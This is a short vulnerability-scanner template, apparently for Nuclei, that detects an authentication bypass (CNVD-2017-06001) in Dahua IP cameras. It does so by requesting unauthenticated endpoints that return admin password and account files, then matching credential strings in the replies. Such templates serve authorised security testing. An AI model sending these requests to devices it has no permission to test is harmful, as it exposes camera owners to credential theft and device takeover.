id: dahua-cnvd-2017-06001

info:
  name: Dahua Authentication Bypass - CNVD-2017-06001
  author: kamerka-fork
  severity: critical
  description: |
    Dahua IP cameras are vulnerable to an authentication bypass that allows
    unauthenticated users to obtain admin credentials by accessing specific API endpoints.
  reference:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2017-06001
  metadata:
    max-request: 3
  tags: china-iot,dahua,auth-bypass,cnvd,ics

requests:
  - method: GET
    redirects: true
    max-redirects: 3
    path:
      - "{{BaseURL}}/current_config/passwd"
      - "{{BaseURL}}/current_config/Account/Users"
      - "{{BaseURL}}/cgi-bin/snapshot.cgi?LoginPassword=Admin"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        regex:
          - "admin:[^:]+:[^:]+"
          - "password=[a-zA-Z0-9!@#$%^&*]+"
        condition: or
